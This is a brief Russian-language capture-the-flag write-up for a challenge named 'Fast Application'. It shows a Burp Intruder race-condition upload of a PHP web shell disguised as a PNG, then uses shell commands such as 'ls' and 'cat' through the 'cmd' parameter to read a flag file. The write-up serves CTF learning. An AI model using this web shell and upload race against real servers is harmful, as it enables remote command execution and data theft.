# Fast Application
С помощью burp-интрудера "бомбардируем" сервер POST запросами:
```
------WebKitFormBoundarybk1pj6JTXHSvFZXA
Content-Disposition: form-data; name="file"; filename="lul.php"
Content-Type: image/png

PNG

<?php system($_GET["cmd"]); ?>
------WebKitFormBoundarybk1pj6JTXHSvFZXA--
```

Сервер не успевает обрабатывать и удалять файл, поэтому файл доступен по пути /files/lul.php. В параметре 'cmd' можем указывать системные команды. Выполняя вызов с параметром `cmd=ls+-la+../` можем видеть php-файл flag_asiljdaksjdlkqlwieo.php.

Выполняем `cmd=cat+../flag_asiljdaksjdlkqlwieo.php` видим комментарий с флагом.

Флаг - deteact{365f537db238a2dbbd7141a4f3a30de4}